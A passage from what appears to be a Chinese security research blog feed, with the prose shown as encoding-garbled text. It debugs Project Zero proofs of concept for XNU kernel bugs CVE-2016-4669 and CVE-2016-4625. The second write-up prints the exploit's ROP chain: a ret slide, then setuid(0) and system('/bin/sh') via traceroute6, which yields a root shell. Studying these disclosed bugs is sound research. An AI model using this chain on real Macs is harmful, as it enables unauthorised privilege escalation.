<p>ç®€å•çš„çœ‹ä¸€ä¸‹4ä¸ª<code>pages</code>çš„é˜Ÿåˆ—ä¸­çš„<code>intermediate</code>ï¼Œåœ¨è¿™ä¸ªé˜Ÿåˆ—ä¸­çš„<code>page</code>é‡Œéƒ½ä¼šæœ‰ä¸€äº›æœªè¢«ä½¿ç”¨çš„å†…å­˜,é€šè¿‡<code>pages</code>é‡Œé¢çš„<code>next</code>å’Œ<code>prev</code>æ„æˆäº†ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p *(zone_page_metadata*)<span class="number">0xffffff8025e06000</span></span><br><span class="line">(zone_page_metadata) $<span class="number">6</span> = &#123;</span><br><span class="line">  pages = &#123;</span><br><span class="line">    next = <span class="number">0xffffff8025548000</span></span><br><span class="line">    prev = <span class="number">0xffffff80213caec8</span></span><br><span class="line">  &#125;</span><br><span class="line">  elements = <span class="number">0xffffff8025e06750</span></span><br><span class="line">  zone = <span class="number">0xffffff80213caea0</span></span><br><span class="line">  alloc_count = <span class="number">252</span></span><br><span class="line">  free_count = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(lldb) p *(zone_page_metadata*)<span class="number">0xffffff8025548000</span></span><br><span class="line">(zone_page_metadata) $<span class="number">12</span> = &#123;</span><br><span class="line">  pages = &#123;</span><br><span class="line">    next = <span class="number">0xffffff8025c96000</span></span><br><span class="line">    prev = <span class="number">0xffffff8025e06000</span></span><br><span class="line">  &#125;</span><br><span class="line">  elements = <span class="number">0xffffff8025548d50</span></span><br><span class="line">  zone = <span class="number">0xffffff80213caea0</span></span><br><span class="line">  alloc_count = <span class="number">252</span></span><br><span class="line">  free_count = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(lldb) p *(zone_page_metadata*)<span class="number">0xffffff8025c96000</span></span><br><span class="line">(zone_page_metadata) $<span class="number">13</span> = &#123;</span><br><span class="line">  pages = &#123;</span><br><span class="line">    next = <span class="number">0xffffff8025cb3000</span></span><br><span class="line">    prev = <span class="number">0xffffff8025548000</span></span><br><span class="line">  &#125;</span><br><span class="line">  elements = <span class="number">0xffffff8025c968e0</span></span><br><span class="line">  zone = <span class="number">0xffffff80213caea0</span></span><br><span class="line">  alloc_count = <span class="number">252</span></span><br><span class="line">  free_count = <span class="number">5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>elements</code>å°±æ˜¯ç¬¬ä¸€ä¸ªå¯ä»¥<code>alloc</code>çš„å†…å­˜ï¼Œé€šè¿‡lldbè§‚å¯Ÿå†…å­˜å¸ƒå±€</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size 8 0xffffff8025c968e0&#10;0xffffff8025c968e0: 0xffffff8025c96670 0xfacade04d7b687dd&#10;&#10;(lldb) memory read --format x --size 8 0xffffff8025c96670&#10;0xffffff8025c96670: 0xffffff8025c96680 0xfacade04d7b6872d&#10;&#10;(lldb) memory read --format x --size 8 0xffffff8025c96680&#10;0xffffff8025c96680: 0xffffff8025c96a40 0xfacade04d7b68bed&#10;&#10;(lldb) memory read --format x --size 8 0xffffff8025c96680&#10;0xffffff8025c96680: 0xffffff8025c96a40 0xfacade04d7b68bed</span><br></pre></td></tr></table></figure>
<p><code>freeelement</code>æ˜¯é€šè¿‡å•å‘é“¾è¡¨éšæœºçš„ä¸²è”åœ¨<code>page</code>ä¸­ï¼Œåœ¨å‰é¢<a href="http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf" target="_blank" rel="external">iOS 10 Kernel Heap Revisited</a>ä¸­æåˆ°çš„ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°å‰é¢çš„8ä¸ªå­—èŠ‚æ§åˆ¶é“¾è¡¨çš„ï¼Œåé¢8ä¸ªå­—èŠ‚æ˜¯<code>freeelement</code>çš„å­˜å‚¨ç©ºé—´ï¼Œ<code>0xfacade</code>å°±æ˜¯å †ä¸­çš„cookiesã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zp_poisoned_cookie &amp;= <span class="number">0x000000FFFFFFFFFF</span>;</span><br><span class="line">zp_poisoned_cookie |= <span class="number">0x0535210000000000</span>; <span class="comment">/* 0xFACADE */</span></span><br></pre></td></tr></table></figure>
<p>äº†è§£äº†<code>freeelement</code>çš„å†…å­˜å¸ƒå±€ï¼Œå†çœ‹ä¸€çœ‹å·²ç»è¢«åˆ†é…äº†çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯<code>memory</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --format x --size <span class="number">8</span> memory</span><br><span class="line"><span class="number">0xffffff8025e06300</span>: <span class="number">0xffffff8029828430</span> <span class="number">0xdeadbeefdeadbeef</span></span><br></pre></td></tr></table></figure>
<p>é˜…è¯»æºç ä¸­çš„<code>zalloc_internal</code>å‡½æ•°çš„å®ç°ï¼Œå¯ä»¥å¾—çŸ¥ï¼Œåœ¨kalloc.16çš„å †ä¸­åˆ†é…ç”³è¯·å†…å­˜æ—¶ï¼Œä¼šå°†ç”³è¯·å‡ºæ¥çš„å†…å­˜ä¼šè¢«å†™å…¥<code>0xdeadbeefdeadbeef</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vm_offset_t</span> *primary  = (<span class="keyword">vm_offset_t</span> *) addr; <span class="comment">//addr == memory</span></span><br><span class="line"><span class="keyword">vm_offset_t</span> *backup   = get_backup_ptr(inner_size, primary);</span><br><span class="line"></span><br><span class="line">*primary = ZP_POISON;</span><br><span class="line">*backup  = ZP_POISON;</span><br></pre></td></tr></table></figure>
<h3 id="2-2-4_ipc_port_release_send">2.2.4 ipc_port_release_send</h3><p>åœ¨å¯¼è‡´å´©æºƒçš„å‡½æ•°å¤„ä¸‹æ–­ç‚¹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b ipc_tt.c :1097</span><br><span class="line">Breakpoint 2: where = kernel.development`mach_ports_register + 521 at ipc_tt.c:1097, address = 0xffffff801e886749</span><br><span class="line">(lldb) c</span><br><span class="line">Process 1 resuming</span><br><span class="line"></span><br><span class="line">Process 1 stopped</span><br><span class="line">* thread #2: tid = 0x0002, 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff8025e06300, portsCnt=3) + 521 at ipc_tt.c:1097, stop reason = breakpoint 2.1</span><br><span class="line">    frame #0: 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff8025e06300, portsCnt=3) + 521 at ipc_tt.c:1097 [opt]</span><br><span class="line">      </span><br><span class="line">(lldb) p ports</span><br><span class="line">(ipc_port_t [3]) $15 = &#123;</span><br><span class="line">  [0] = 0xffffff80279d8190</span><br><span class="line">  [1] = 0x0000000000000000</span><br><span class="line">  [2] = 0x0000000000000000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°<code>ports</code>çš„å€¼åªæœ‰ports[0]æœ‰å€¼ï¼Œè¿™æ˜¯å› ä¸ºè¿™é‡Œçš„<code>ports</code>æ˜¯ä»æ—§çš„<code>port</code>ä¸­æ›¿æ¢æ¥çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> *	Replace the old send rights with the new.</span><br><span class="line"> *	Release the old rights after unlocking.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TASK_PORT_REGISTER_MAX; i++) &#123;</span><br><span class="line">	<span class="keyword">ipc_port_t</span> old;</span><br><span class="line"></span><br><span class="line">	old = task-&gt;itk_registered[i];</span><br><span class="line">	task-&gt;itk_registered[i] = ports[i];</span><br><span class="line">	ports[i] = old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ®æ‚‰æ‰§è¡Œåï¼Œ<code>r3gister</code>ä¼šå†æ¬¡è¢«æ–­ä½ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨<code>mach_ports_register</code>åï¼Œå†…æ ¸æ–­ç‚¹ï¼Œå†çœ‹<code>ports</code>ï¼Œå¦‚ä¸‹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* thread #2: tid = 0x0002, 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff80253d3e70, portsCnt=3) + 521 at ipc_tt.c:1097, stop reason = breakpoint 2.1</span><br><span class="line">    frame #0: 0xffffff801e886749 kernel.development`mach_ports_register(task=&lt;unavailable&gt;, memory=0xffffff80253d3e70, portsCnt=3) + 521 at ipc_tt.c:1097 [opt]</span><br><span class="line">(lldb) p ports</span><br><span class="line">(ipc_port_t [3]) $16 = &#123;</span><br><span class="line">  [0] = 0xffffff8029828430</span><br><span class="line">  [1] = 0xdeadbeefdeadbeef</span><br><span class="line">  [2] = 0xffffff80252f1460</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»è€Œå¯¼è‡´åœ¨æœåŠ¡å™¨çš„åç»­ä»£ç ä¸­è§¦å‘äº†å´©æºƒ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; TASK_PORT_REGISTER_MAX; i++)</span><br><span class="line">	if (IP_VALID(ports[i]))</span><br><span class="line">		ipc_port_release_send(ports[i]);//&lt;--ç¬¬äºŒä¸ªportså°±æ˜¯0xdeadbeefdeadbeef</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> *	Now that the operation is known to be successful,</span><br><span class="line"> *	we can free the memory.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">if (portsCnt != 0)</span><br><span class="line">	kfree(memory,</span><br><span class="line">	      (vm_size_t) (portsCnt * sizeof(mach_port_t)));</span><br></pre></td></tr></table></figure>
<h1 id="0x03_å°ç»“">0x03 å°ç»“</h1><p>è¿™é‡Œåªåˆ†æäº†<code>POC</code>çš„è§¦å‘ï¼Œå¦‚æœä¿®æ”¹<code>mach_ports_register</code>çš„å‚æ•°ï¼Œå°†<code>port</code>çš„ä¸ªæ•°æ”¹ä¸º2ä¸ªï¼Œport[1]å°±ä¼šå˜æˆ<code>0x0000000000000000</code>ï¼Œä»è€Œé¿å…äº†å¯¹<code>0xdeadbeefdeadbeef</code>è°ƒç”¨å‡½æ•°å‡ºå‘å´©æºƒï¼Œè€Œä¸”zoneä¼šå˜æˆiportsçš„ä¸€ä¸ªä¸“ç”¨çš„<code>zone</code>ï¼Œè€Œä¸æ˜¯<code>kalloc.16</code>,æ‰€ä»¥è¿™ä¸ªæ¼æ´å€¼å¾—ç ”ç©¶çš„åœ°æ–¹è¿˜æœ‰å¾ˆå¤šã€‚å¸Œæœ›æœ¬æ–‡èƒ½ä¸ºå¤§å®¶ç»§ç»­ç ”ç©¶è¿™ä¸ªæ¼æ´æä¾›ä¸€äº›å¸®åŠ©ï¼›-ï¼‰ã€‚</p>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1><p>1ã€<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=882&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X/iOS multiple memory safety issues in mach_ports_register</a></p>
<p>2ã€<a href="http://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf" target="_blank" rel="external">iOS 10 Kernel Heap Revisited</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>æœ¬æ–‡è®°å½•äº†å¯¹<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-4669">CVE-2016-4669</a>çš„<a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=244431">POC</a>çš„è°ƒè¯•ä¸­é‡åˆ°çš„é—®é¢˜ï¼Œä»¥åŠç›¸å…³çŸ¥è¯†çš„æ•´ç†ï¼Œè¯¥æ¼æ´çš„åŸå§‹æŠ¥å‘Šåœ¨<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=882&amp;can=1&amp;q=apple&amp;sort=-id">è¿™é‡Œ</a>ã€‚åŸå§‹æŠ¥å‘Šä¸­çš„å†…å®¹ï¼Œæœ¬æ–‡ä¸åœ¨å¤è¿°ã€‚</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[XNUå†…æ ¸ä¸­task_tç›¸å…³æ¼æ´åˆ†æç¬”è®°(Part I)]]></title>
    <link href="http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/"/>
    <id>http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/</id>
    <published>2016-10-28T20:09:25.000Z</published>
    <updated>2016-10-29T02:52:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    å‰ä¸¤å¤©<a href="https://googleprojectzero.blogspot.com/" target="_blank" rel="external">Project Zero</a>çš„blogä¸Šé¢ï¼ŒIan Beerå‘è¡¨äº†ä¸€ç¯‡æ–°çš„æ–‡ç« ï¼Œè®¨è®ºäº†åœ¨<code>xnu</code> çš„å†…æ ¸åœ¨è®¾è®¡ä¸Šå­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜ï¼Œä»è€Œå¯ä»¥å¯¼è‡´ææƒï¼Œæ²™ç®±é€ƒé€¸ç­‰ä¸€æ´—äº†çš„é—®é¢˜ã€‚å¹¶ä¸”æä¾›äº†ç›¸åº”çš„çš„POCä¸EXPæºç ã€‚è¿™ç¯‡æ–‡ç« æ˜¯è°ƒè¯•ä¸åˆ†æå…¶ä¸­ç¬¬ä¸€ä¸ªæ¼æ´<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4625" target="_blank" rel="external">CVE-2016-4625</a>çš„éƒ¨åˆ†ã€‚</p>
<p><a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a></p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=831&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X/iOS kernel use-after-free in IOSurface</a></p>
<a id="more"></a>
<h1 id="0x01_å‡†å¤‡å·¥ä½œ">0x01 å‡†å¤‡å·¥ä½œ</h1><h2 id="1-1_åŸºç¡€çŸ¥è¯†">1.1 åŸºç¡€çŸ¥è¯†</h2><p>â€‹    åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰ï¼Œéœ€è¦ç¨å¾®äº†è§£ä¸€ä¸‹<code>mach_msg</code>ç›¸å…³çš„çŸ¥è¯†ï¼Œä»¥åŠä¸€äº›ä½¿ç”¨<code>mach_msg</code>çš„æŠ€å·§ï¼Œç†è§£çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹äº¤æ¢<code>port</code>ä¹‹åå¯ä»¥åšä¸€äº›æ“ä½œã€‚</p>
<ul>
<li><a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">å†çœ‹CVE-2016-1757â€”æµ…æmach messageçš„ä½¿ç”¨</a></li>
<li><a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html" target="_blank" rel="external">Changes to XNU Mach IPC</a></li>
</ul>
<h2 id="1-2_è°ƒè¯•ç¯å¢ƒ">1.2 è°ƒè¯•ç¯å¢ƒ</h2><p>â€‹    æœ¬æ–‡çš„<code>EXP</code>çš„è¿è¡Œç¯å¢ƒæ˜¯<code>OS X 10.11.6</code>ã€‚ä½¿ç”¨çš„è™šæ‹Ÿæœºè½¯ä»¶æ˜¯parallels desktop</p>
<h2 id="0x02_æ¼æ´æˆå› ">0x02 æ¼æ´æˆå› </h2><p>â€‹    <a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a>è¿™ç¯‡å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†ã€‚è¿™å¹…å›¾å¤§è‡´ååº”å‡ºæ•´ä¸ªæµç¨‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/task_t_analysis/EXP_flow.png" alt="exploitæ‰§è¡Œæµç¨‹"></p>
<h1 id="0x03_Exploitè°ƒè¯•">0x03 Exploitè°ƒè¯•</h1><p>å¯¹ç†è§£æ•´ä¸ª<code>exploit</code>å…³é”®çš„å‡ ä¸ªç‚¹è¿›è¡Œè°ƒè¯•ã€‚</p>
<h2 id="3-1_setup_payload_and_offsets">3.1 setup_payload_and_offsets</h2><p>é¦–å…ˆé€šè¿‡<code>memmem</code>å‡½æ•°åœ¨<code>libsystem_c.dylib</code>ä¸­æ‰¾åˆ°å‡ ä¸ªç›¸åº”çš„<code>ROP</code>ç»„ä»¶ã€‚</p>
<ul>
<li>retæŒ‡ä»¤æ‰€åœ¨åœ°å€<code>0x7fff8fe520d5</code>ã€‚</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s    ret&#10;libsystem_c.dylib`strcpy:&#10;    0x7fff8fe520d5 &#60;+85&#62;:  ret&#10;    0x7fff8fe520d6 &#60;+86&#62;:  movdqu xmm0, xmmword ptr [rsi + rcx]&#10;    0x7fff8fe520db &#60;+91&#62;:  movdqu xmmword ptr [rdi], xmm0</span><br></pre></td></tr></table></figure>
<ul>
<li>pop_rdi_retæŒ‡ä»¤æ‰€åœ¨åœ°å€<code>0x7fff8fe8a213</code>ã€‚</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s pop_rdi_ret&#10;libsystem_c.dylib`addr2ascii:&#10;    0x7fff8fe8a213 &#60;+116&#62;: pop    rdi&#10;    0x7fff8fe8a214 &#60;+117&#62;: ret&#10;    0x7fff8fe8a215 &#60;+118&#62;: add    al, 0x0</span><br></pre></td></tr></table></figure>
<ul>
<li>stack_shift_gadgetæŒ‡ä»¤æ‰€åœ¨åœ°å€<code>0x7fff8fed1cec</code></li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis -s stack_shift_gadget&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;    0x7fff8fed1cec &#60;+1935&#62;: add    rsp, 0x1d88&#10;    0x7fff8fed1cf3 &#60;+1942&#62;: pop    rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret</span><br></pre></td></tr></table></figure>
<p>å› ä¸º<code>traceroute6</code>çš„æ ˆè¶³å¤Ÿé•¿ï¼Œæ‰€ä»¥<code>exploit</code>å°†<code>payload</code>å°±æ”¾åœ¨æ ˆä¸Šï¼Œé€šè¿‡<code>stack_shift_gadget</code>è·³åˆ°ä¸€ä¸²è¿ç»­çš„<code>ret</code>çš„<code>gadget</code>å¤„ï¼Œä»è€Œè§¦å‘ææƒä»£ç çš„æ‰§è¡Œã€‚</p>
<p>åœ¨args_u64çš„<code>ROP</code>æ ˆå¤„ç†å¥½ä¹‹åï¼Œå†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8  -format x -c100 args_u64&#10;0x101000000: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000010: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000020: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000030: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000040: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000050: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000060: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000070: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000080: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000090: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000a0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000b0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000c0: 0x00007fff8fe520d5 0x00007fff8fe520d5</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>0x00007fff8fe520d5</code>å°±æ˜¯<code>ret</code>çš„ <code>gad_get</code>çš„åœ°å€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">383</span>   <span class="comment">// ret-slide</span></span><br><span class="line"><span class="number">384</span>   <span class="keyword">int</span> i;</span><br><span class="line"><span class="number">385</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ret_slide_length; i++) &#123;</span><br><span class="line"><span class="number">386</span>     args_u64[i] = ret;</span><br><span class="line"><span class="number">387</span>   &#125;</span><br><span class="line"><span class="number">388</span></span><br><span class="line"><span class="number">389</span>   args_u64[i] = pop_rdi_ret;</span><br><span class="line"><span class="number">390</span>   args_u64[i+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">391</span>   args_u64[i+<span class="number">2</span>] = (<span class="keyword">uint8_t</span>*)&amp;setuid;</span><br><span class="line"><span class="number">392</span>   args_u64[i+<span class="number">3</span>] = pop_rdi_ret;</span><br><span class="line"><span class="number">393</span>   args_u64[i+<span class="number">4</span>] = bin_sh;</span><br><span class="line"><span class="number">394</span>   args_u64[i+<span class="number">5</span>] = (<span class="keyword">uint8_t</span>*)&amp;system;</span><br></pre></td></tr></table></figure>
<p>åœ¨æ‰§è¡Œ389-394è¡Œä¹‹åï¼Œæœ€åçš„<code>stack</code>å†…å­˜çš„å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x i&#10;(int) $32 = 0x00000102&#10;(lldb) p &#38;args_u64[0x102]&#10;(uint8_t **) $30 = 0x0000000101000810&#10;&#10;(lldb) memory read -size 8 -format x -count 30 0x0000000101000790&#10;0x101000790: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007a0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007b0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007c0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007d0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007e0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007f0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000800: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000810: 0x00007fff8fe8a213 0x0000000000000000&#10;0x101000820: 0x00007fff8a183628 0x00007fff8fe8a213&#10;0x101000830: 0x00007fff8fedb69e 0x00007fff8fed0e0b&#10;0x101000840: 0x0000000000000000 0x0000000000000000&#10;0x101000850: 0x0000000000000000 0x0000000000000000&#10;0x101000860: 0x0000000000000000 0x0000000000000000&#10;0x101000870: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>0x101000800</code>ä¹‹å‰éƒ½æ˜¯ç”¨<code>ret</code>çš„<code>gad_get</code>å¡«å……çš„ï¼Œä»<code>0x101000810</code>å¼€å§‹æ˜¯ä¼ªé€ çš„è°ƒç”¨æ ˆçš„ç»“æ„ã€‚å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*			args</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   ret             | +---------+</span><br><span class="line">   * 		+-------------------+           |</span><br><span class="line">   * 		|   ret             |		 0x101ä¸ª</span><br><span class="line">   * 		+-------------------+           |</span><br><span class="line">   * 		|   ret             | +---------+</span><br><span class="line">   *  		+-------------------+</span><br><span class="line">   * 		|   pop_rdi_ret     |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   0               |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   setuid          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   pop_rdi_ret     |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   bin_sh          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   system          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   *		</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p><code>ROP</code>çš„é€»è¾‘å¾ˆç®€å•ï¼Œé€šè¿‡è·³è½¬åˆ°ä¸Šé¢ä»»æ„ä¸€ä¸ª<code>ret</code>ï¼Œå°±ä¼šæ‰§è¡Œsetuid(0),å¹¶ä¸”åˆ›å»ºä¸€ä¸ªå…·æœ‰<code>root</code>æƒé™çš„<code>shell</code>ã€‚é€šè¿‡<code>execve</code>è°ƒç”¨<code>traceroute6</code>çš„æ—¶å€™éœ€è¦å°†è¿™ä¸€æ®µå¹¶åˆ°<code>execve</code>çš„å‚æ•°ä¸Šé¢å»ã€‚</p>
